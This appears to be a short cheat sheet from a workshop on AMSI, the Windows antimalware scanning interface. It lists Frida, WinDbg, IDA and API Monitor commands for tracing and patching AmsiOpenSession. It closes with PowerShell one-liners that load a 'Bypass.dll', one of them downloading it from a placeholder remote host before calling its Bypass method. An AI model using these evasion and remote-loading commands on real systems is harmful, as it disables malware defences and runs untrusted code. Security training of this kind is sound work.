## AMSI Workshop Commands

### FRIDA

```shell
frida-trace -p <PID> -x amsi.dll -i Amsi*
```

### WINDBG

```shell
dc 0x23123 -> Dump memory content

u amsi!AmsiOpenSession  -> Unassemble function

u amsi!AmsiOpenSession+0x23 L2  -> Unassemble function, two lines

u amsi!AmsiOpenSession+0x23 L1A  -> Unassemble function

bp amsi!AmsiOpenSession  -> Breakpoint

g -> continue

dc rcx L1 -> Dump content of rcx 

ed rcx 0 -> Edit rcx por 0

? 0n140736475571392 -> Convert memory position to hexadecimal 

r -> show registry 

r rax -> read a registry

dd, dc y dq -> 32bit, 32 bit in asci, 64bits

p -> continue

!vprot <address> -> Show protections of a memory region

```

### IDA 
```shell
F2 -> Breakpoint
F9 -> Run
F7 -> Step over
F8 -> Step into
```

### APIMonitor

Load amsi.dll as external DLL. Open a new PowerShell Process, execute a command and the api calls should appear.

### Load a DLL using PowerShell 
```shell
Load the DLL using PowerShell locally
[System.Reflection.Assembly]::LoadFile('Absolute_Path_to_DLL\Bypass.dll')
[Super]::Bypass()

Load the DLL using PowerShell from a remote source
[System.Reflection.Assembly]::Load((new-object net.webclient).DownloadData("http://IP:PORT/Bypass.dll"))
[Super]::Bypass()
```
